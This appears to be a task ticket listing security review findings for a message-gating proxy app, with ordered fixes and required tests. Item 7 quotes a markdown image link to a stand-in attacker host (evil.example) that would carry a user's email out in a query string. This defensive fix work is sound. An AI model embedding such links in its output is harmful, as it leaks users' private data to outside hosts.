# T81 — Fixes from the repo security review (small, safe, tested)

An independent read-only review of the whole repo (app, proxy, hosted demo, Docker, extension) found the issues
below. Fix the ones marked FIX with the smallest safe change and a test for each. Do NOT touch README.md or
anything under `src/shadowfenced/static/` (another branch is editing the UI). Do not commit; leave changes in the

## FIX (in this order)
1. **Hosted demo: one visitor could read another visitor's held messages.** `/api/log/events`
   (`app.py` ~2992–3030) returns `decision_id`s and has no hosted guard; `hold_id == decision_id`
   (`holds.py` ~224); `GET /api/holds/{id}` returns pending text, answer, sent_text; `POST /api/holds/{id}/rule`
   can act on any hold. Fix: in hosted mode, `/api/log/events` returns no events (or 404 like other disabled
   hosted endpoints — follow the existing `_refuse_hosted_storage` pattern) so hold ids are never listed; hold ids
   stay unguessable (uuid4 hex). Add a test that hosted `/api/log/events` exposes no decision ids.
2. **`/api/send` sends system/assistant/tool messages to the cloud unchecked** (`app.py` ~399 keeps non-user
   messages; only user text is gated, ~356). Fix: gate every role's text with the same engine as user text
   (reuse the `/v1` path's `_gate_chat_messages` if it fits); any BLOCK/HOLD in any role decides the send.
   Tests: key in a system message → BLOCK, nothing sent.
3. **`/v1` forwards unchecked message fields.** Forward only `role`, `content`, `tool_calls`, `tool_call_id`
   (drop `name`, `function_call`, anything else). Also fix: plain-string content parts are gated but not
   rewritten in `_rebuild_chat_message` (`if is_text and isinstance(part, dict)`), so the raw string is forwarded.
   Tests for both.
4. **`POST /api/provider` has no hosted guard** (`app.py` ~2771): one visitor changes the provider for everyone.
   Refuse in hosted mode like the other storage endpoints. Test.
5. **Docker exposes the console:** `compose.yaml` port → `"127.0.0.1:8765:8765"`; keep the Dockerfile's
   `0.0.0.0` (needed inside the container) but add a comment. In local (non-hosted) mode add
   `TrustedHostMiddleware(allowed_hosts=["127.0.0.1","localhost","testserver"])` so DNS rebinding fails; hosted
   mode must keep working (do not add it there). Test both modes.
6. **Uploads read the whole body before the size check** (`app.py` ~2646, `ext_api` `file.file.read()`): check
   `file.size` when available before reading, and read at most cap+1 bytes. Test with an oversize file.
7. **Rehydration inside URLs.** `redact.rehydrate` (`redact.py` ~135) restores real values inside link targets and
   query strings (`![x](https://evil.example/?d=[PII_EMAIL_1])`, `[a](mailto:[PII_EMAIL_1])` targets, bare URLs).
   Fix: do not restore a placeholder that sits inside a URL or a markdown link/image target; leave the placeholder
   there and add a note to the answer highlights if that structure exists. Restoring in normal prose must keep
   working (all existing rehydrate tests pass). Tests for markdown image, link target, bare URL query.
